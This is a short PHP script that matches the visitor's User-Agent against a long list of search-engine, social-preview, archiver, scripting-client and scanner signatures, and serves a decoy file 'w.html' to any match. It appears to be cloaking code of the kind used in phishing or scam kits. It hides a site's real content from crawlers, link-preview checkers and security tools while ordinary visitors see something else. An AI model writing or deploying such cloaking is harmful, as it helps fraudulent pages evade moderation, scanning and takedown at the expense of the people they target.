<?php
$userAgent = strtolower($_SERVER['HTTP_USER_AGENT']);

$botPatterns = [
    'googlebot',            
    'facebookexternalhit',  
    'bingbot',      // Bing
    'slurp',        // Yahoo
    'duckduckbot',  // DuckDuckGo
    'baiduspider',  // Baidu
    'yandex',       // Yandex
    'facebookexternalhit', // Facebook
    'twitterbot',   // Twitter
    'facebot',      // Facebook
    'linkedinbot',  // LinkedIn
    'pinterest',    // Pinterest
    'tiktok',       // TikTok
    'facebot',              
    'tiktok',               
    'adsbot',
    'googleother',
    'inspectiontool',
    'feedfetcher',
    'mediapartners',
    'bingbot',
    'slurp',
    'wget',
    'python',
    'linkedin',
    'aiohttp',
    'httpx',
    'libwww',
    'httpunit',
    'nutch',
    'go-http-client',
    'phpcrawl',
    'msnbot',
    'jyxobot',
    'crawl',
    'seekbot',
    'ia_archiver',
    'httrack',
    'grub.org',
    'antibot',
    'speedy',
    'yacybot',
    'findlink',
    'ips-agent',
    'mj12',
    'yandex',
    'cyberpatrol',
    'baiduspider',
    'spider',
    'sitebot',
    'linkdex',
    'phx',
    'pagething',
    'macocu',
    'netsystemsresearch',
    'opengraphcheck',
    'node-fetch',
    'metainspector',
    'telegram'
];

$isBot = false;
foreach ($botPatterns as $pattern) {
    if (strpos($userAgent, $pattern) !== false) {
        $isBot = true;
        break;
    }
}

if ($isBot) {
    require_once 'w.html';
    die();
} 

?>